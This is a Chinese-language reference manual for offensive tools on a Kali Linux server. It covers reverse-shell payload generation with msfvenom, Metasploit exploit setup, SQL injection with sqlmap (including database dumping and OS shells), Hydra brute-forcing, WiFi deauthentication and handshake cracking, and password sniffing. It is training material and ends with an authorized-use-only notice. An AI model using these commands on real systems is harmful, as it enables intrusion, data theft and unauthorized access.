# Kali Linux 实用工具手册

> 本服务器 Kali GNU/Linux Rolling 所有工具实际安装路径与用法

---

## 已安装工具速查

| 工具 | 版本 | 路径 | 用途 |
|------|------|------|------|
| nmap | system | /usr/bin/nmap | 网络扫描 |
| metasploit-framework | 6.4.99 | /usr/bin/msfconsole | 渗透测试框架 |
| aircrack-ng | 1.7 | /usr/bin/aircrack-ng | WiFi 安全审计 |
| burpsuite | 2025.10.6 | /usr/bin/burpsuite | Web 代理/渗透 |
| wireshark | 4.6.0 | /usr/bin/wireshark | 流量分析 |
| sqlmap | system | /usr/bin/sqlmap | SQL 注入自动化 |
| hydra | system | /usr/bin/hydra | 暴力破解 |
| nikto | 2.5.0 | /usr/bin/nikto | Web 服务器扫描 |
| openvas | 23.30.1 | /usr/sbin/openvas | 漏洞扫描 |
| wifite | 2.7.0 | /usr/bin/wifite | 自动化无线审计 |
| msfvenom | - | /usr/bin/msfvenom | Payload 生成 |
| searchsploit | - | /usr/bin/searchsploit | Exploit 数据库 |

---

## Nmap 实战用法

### 基础扫描
```bash
# 扫描单个主机
nmap 192.168.1.1

# 扫描整个网段
nmap 192.168.1.0/24

# 扫描多个目标
nmap 192.168.1.1 192.168.1.2 192.168.1.3

# 跳过 ping（无 ping 扫描）
nmap -Pn 192.168.1.1
```

### 端口与服务探测
```bash
# 指定端口扫描
nmap -p 22,80,443 192.168.1.1

# 扫描所有端口
nmap -p- 192.168.1.1

# 版本检测
nmap -sV 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1

# 综合扫描（OS + 版本 + 脚本）
nmap -A 192.168.1.1

# 快速扫描（Top 100 端口）
nmap --top-ports 100 192.168.1.1
```

### NSE 脚本（漏洞扫描）
```bash
# 使用默认脚本
nmap --script default 192.168.1.1

# 使用漏洞检测脚本
nmap --script vuln 192.168.1.1

# 使用特定脚本（如 DNS 区域传送）
nmap --script dns-zone-transfer -p 53 192.168.1.1

# 查看所有脚本分类
nmap --script-help "discovery or version"
```

### 输出格式
```bash
# 保存为普通文本
nmap -oN scan.txt 192.168.1.1

# 保存为 XML
nmap -oX scan.xml 192.168.1.1

# 保存为所有格式
nmap -oA scan 192.168.1.1
```

---

## Metasploit Framework（msfconsole）

### 启动
```bash
msfconsole
# 或带数据库
msfdb init && msfconsole
```

### 核心命令
```bash
# 搜索模块
search mysql
search type:exploit name:smb

# 使用模块
use auxiliary/scanner/mysql/mysql_version
use exploit/linux/samba/is_known_pipename

# 查看选项
show options
show missing

# 设置参数
set RHOSTS 192.168.1.1
set RPORT 443
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# 查看可用的 payload
show payloads

# 运行
run
exploit

# 后台运行
run -j
exploit -j
```

### 常用模块位置
```
exploit/windows/smb/
exploit/linux/samba/
exploit/multi/http/
auxiliary/scanner/portscan/
auxiliary/scanner/mysql/
auxiliary/scanner/smb/
```

### msfvenom（独立 Payload 生成）
```bash
# 生成 Linux 反向 shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# 生成 Windows exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# 生成 Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444

# 列出所有编码器
msfvenom --list encoders
```

---

## BurpSuite 实战用法

### 启动（免费版）
```bash
burpsuite
# 或无头模式
burpsuite --headless &
```

### 代理配置
```
# 浏览器代理设置
127.0.0.1:8080

# 拦截开关：Proxy -> Intercept -> Intercept is on/off
```

### 核心功能
```
Proxy          → 拦截/修改请求
Spider         → 自动爬取网站
Scanner        → 漏洞扫描（专业版）
Intruder       → 暴力测试/参数 fuzz
Repeater       → 重放请求
Decoder        → 编码/解码
Comparer       → 对比两个请求/响应
```

### 常用操作
1. **拦截请求**：Proxy -> Intercept -> 浏览器访问目标 -> 修改请求 -> Forward
2. **历史记录**：Proxy -> HTTP History 查看所有请求
3. **被动扫描**：流量经过时自动发现漏洞
4. **Repeater 重放**：右键 Request -> Send to Repeater -> 修改参数 -> Send

### repeater 使用示例
```
目标 URL: http://192.168.1.1/admin/login
1. 浏览器设置代理，访问目标页面
2. BurpSuite 拦截登录 POST 请求
3. Send to Repeater
4. 修改用户名参数：admin' OR '1'='1
5. Send，观察响应
```

---

## Wireshark 流量分析

### 启动
```bash
# GUI 界面
wireshark &

# 无界面（CLI 抓包）
tshark -i eth0 -w capture.pcap

# 快速查看抓包文件
tshark -r capture.pcap -Y "http" | head -20
```

### 常用过滤器
```
# IP 过滤
ip.addr == 192.168.1.1
ip.src == 192.168.1.1
ip.dst == 192.168.1.1

# 端口过滤
tcp.port == 80
udp.port == 53

# 协议过滤
http
dns
ssh
ftp
arp

# 组合
ip.addr == 192.168.1.1 && http

# 搜索关键字
http contains "password"
tcp contains "login"
```

### 常见分析场景
```
# 查看 HTTP 请求
http.request.method == "GET" || http.request.method == "POST"

# 查看明文密码（危险操作）
http.request.method == "POST" && http contains "password"

# 查看 DNS 查询
dns

# 统计 -> 流量图 -> HTTP Requests
```

---

## SQLMap 实战用法

### 基础扫描
```bash
# 检测注入点
sqlmap -u "http://target.com/page.php?id=1"

# 指定参数
sqlmap -u "http://target.com/page.php?id=1" -p id

# 指定方法（POST）
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
```

### 进阶选项
```bash
# 获取数据库列表
sqlmap -u "URL" --dbs

# 获取表
sqlmap -u "URL" -D database_name --tables

# 获取列
sqlmap -u "URL" -D database_name -T table_name --columns

# 导出数据
sqlmap -u "URL" -D database_name -T table_name --dump

# 指定 DBMS
sqlmap -u "URL" --dbms=mysql

# 识别 WAF
sqlmap -u "URL" --check-waf

# 延迟（躲避检测）
sqlmap -u "URL" --delay=1
```

### 交互式 Shell
```bash
sqlmap -u "URL" --os-shell
sqlmap -u "URL" --sql-shell
```

---

## Hydra 暴力破解

### 基础用法
```bash
# SSH 暴力破解
hydra -l root -p password.txt 192.168.1.1 ssh

# 用户名列表
hydra -L users.txt -P passwords.txt 192.168.1.1 ssh

# FTP
hydra -l admin -P pass.txt 192.168.1.1 ftp

# HTTP 表单
hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# 恢复中断的破解
hydra -R
```

### 常用协议
```
ssh, ftp, telnet, http-get, http-post-form
smb, rdp, vnc, mysql, postgresql, mssql
```

### 优化参数
```bash
# 多线程
hydra -t 4 192.168.1.1 ssh

# 详细输出
hydra -V 192.168.1.1 ssh

# 保存结果
hydra -o results.txt 192.168.1.1 ssh
```

---

## Nikto Web 扫描

### 基础用法
```bash
# 扫描目标
nikto -h 192.168.1.1

# 指定端口
nikto -h 192.168.1.1 -p 443

# HTTPS
nikto -h https://192.168.1.1

# 保存输出
nikto -h 192.168.1.1 -o scan.txt -Format txt

# 代理
nikto -h 192.168.1.1 -proxy 127.0.0.1:8080
```

### 常用选项
```bash
# 只扫描特定类型
nikto -h URL -Tuning 1  # 文件输出
nikto -h URL -Tuning 2  # 配置错误
nikto -h URL -Tuning 3  # 信息泄露

# 更新插件
nikto -update
```

---

## Aircrack-ng WiFi 安全

### 基础命令
```bash
# 查看无线网卡
airmon-ng

# 开启监听模式
airmon-ng start wlan0

# 扫描 WiFi（监听模式下用 wlan0mon）
airodump-ng wlan0mon

# 抓取握手包
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 解除认证（获取握手包）
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 暴力破解握手包
aircrack-ng -w passwords.txt capture-01.cap
```

### 完整流程
```bash
# 1. 监听
airmon-ng start wlan0

# 2. 扫描
airodump-ng wlan0mon

# 3. 抓包（专注目标 AP）
airodump-ng -c 6 -w /tmp/capture --bssid MAC wlan0mon

# 4. 注入（另一个终端）
aireplay-ng -0 10 -a AP_MAC wlan0mon

# 5. 破解
aircrack-ng -w wordlist.txt /tmp/capture-01.cap
```

---

## OpenVAS 漏洞扫描

### 启动服务
```bash
# 启动 Greenbone 安全助手
openvas-start

# 或手动
gsad --mlisten 127.0.0.1 --mport 9390
gvmd -p 9390 -a 127.0.0.1
```

### Web 界面
```
地址: https://localhost:9392
首次需要创建管理员账户
```

### CLI 扫描
```bash
# 创建扫描目标
omp -h localhost -p 9390 -u admin -w PASS -X '<create_target><name>Test</name><hosts>192.168.1.1</hosts></create_target>'

# 或者用 greenbone-scapdata 导入 Feed
```

---

## searchsploit 本地 Exploit 库

```bash
# 搜索关键词
searchsploit apache 2.4
searchsploit smb 3.0
searchsploit "remote code execution" | head -20

# 查看详情
searchsploit -x exploits/linux/remote/12345.py

# 复制到当前目录
searchsploit -m 12345.py

# 查找本地 Exploit
searchsploit -s "buffer overflow" | grep linux

# 更新数据库
searchsploit -u
```

---

## Wifite 自动化

```bash
# 启动（自动检测网卡）
wifite

# 指定网卡
wifite -i wlan0

# 自动化流程：
# 1. 自动扫描 WiFi
# 2. 自动抓取 WPA/WPA2 握手包
# 3. 自动跑字典破解
# 4. 结果保存
```

---

## 使用注意 ⚠️

1. **仅限授权测试**：未授权的渗透测试违法
2. **仅在内网使用**：本服务器在内网环境
3. **学习用途**：所有工具仅用于学习 Kali 使用
4. **遵守法律**：《网络安全法》等相关法规
